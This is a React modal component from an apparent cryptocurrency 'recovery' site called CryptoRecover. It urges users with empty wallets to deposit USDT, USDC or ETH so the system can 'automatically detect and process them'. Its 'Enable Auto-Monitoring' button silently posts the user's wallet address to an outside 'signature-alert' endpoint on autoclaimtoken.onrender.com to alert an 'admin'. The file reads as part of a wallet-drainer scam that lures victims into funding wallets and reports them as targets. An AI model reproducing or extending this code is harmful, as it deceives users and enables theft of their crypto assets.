import { useState } from 'react';
import { Wallet, TrendingUp, Shield, AlertCircle, RefreshCw } from 'lucide-react';

export default function EmptyWalletMessage({ userAddress, onRefresh }) {
  const [monitoring, setMonitoring] = useState(false);

  const handleStartMonitoring = async () => {
    setMonitoring(true);
    
    // Alert admin to monitor this wallet
    await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'WALLET_MONITORING_STARTED',
        userAddress: userAddress,
        monitoringEnabled: true,
        userRequested: true
      })
    }).catch(() => {});
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden">
        {/* Header */}
        <div className="bg-gradient-to-r from-blue-600 to-purple-600 p-6 text-white">
          <div className="flex items-center space-x-3">
            <Wallet className="w-8 h-8" />
            <div>
              <h2 className="text-xl font-bold">Wallet Setup Required</h2>
              <p className="text-sm opacity-90">CryptoRecover Recovery System</p>
            </div>
          </div>
        </div>

        {/* Content */}
        <div className="p-6">
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
            <div className="flex items-start space-x-3">
              <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-yellow-800">Wallet Not Ready for Recovery</h3>
                <p className="text-yellow-700 text-sm mt-1">
                  Your wallet appears to be empty. To use our recovery services, you need assets in your wallet.
                </p>
              </div>
            </div>
          </div>

          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
            <div className="flex items-start space-x-3">
              <TrendingUp className="w-5 h-5 text-blue-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-blue-800">Recommended Actions</h3>
                <ul className="text-blue-700 text-sm mt-2 space-y-1">
                  <li>• Deposit USDT, USDC, or ETH to your wallet</li>
                  <li>• Transfer tokens from exchanges (Binance, Coinbase)</li>
                  <li>• Receive payments or airdrops</li>
                  <li>• Add gas fees (ETH) for transactions</li>
                </ul>
              </div>
            </div>
          </div>

          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h4 className="font-semibold text-gray-800 mb-2">Your Wallet Address:</h4>
            <div className="bg-white border rounded p-3">
              <p className="font-mono text-sm text-gray-700 break-all">
                {userAddress}
              </p>
            </div>
            <p className="text-xs text-gray-500 mt-2">
              Send tokens to this address to enable recovery services
            </p>
          </div>

          <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
            <div className="flex items-start space-x-3">
              <Shield className="w-5 h-5 text-green-600 mt-0.5" />
              <div>
                <h3 className="font-semibold text-green-800">Auto-Monitoring Service</h3>
                <p className="text-green-700 text-sm mt-1">
                  We'll automatically monitor your wallet for incoming deposits and notify you when recovery services become available.
                </p>
              </div>
            </div>
          </div>

          {/* Action buttons */}
          <div className="flex space-x-3">
            <button
              onClick={handleStartMonitoring}
              disabled={monitoring}
              className="flex-1 bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 px-4 rounded-lg font-semibold hover:opacity-90 transition-opacity disabled:opacity-50 flex items-center justify-center space-x-2"
            >
              {monitoring ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Monitoring Active...</span>
                </>
              ) : (
                <>
                  <Shield className="w-4 h-4" />
                  <span>Enable Auto-Monitoring</span>
                </>
              )}
            </button>
            
            <button
              onClick={onRefresh}
              className="px-4 py-3 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors flex items-center space-x-2"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Refresh</span>
            </button>
          </div>

          <div className="mt-6 text-center">
            <p className="text-sm text-gray-600 mb-2">
              <strong>Popular deposit methods:</strong>
            </p>
            <div className="flex justify-center space-x-4 text-xs text-gray-500">
              <span>• Binance Withdrawal</span>
              <span>• Coinbase Send</span>
              <span>• MetaMask Transfer</span>
            </div>
          </div>

          <p className="text-xs text-gray-500 mt-4 text-center">
            Once you deposit tokens, our recovery system will automatically detect and process them for maximum yield recovery.
          </p>
        </div>
      </div>
    </div>
  );
}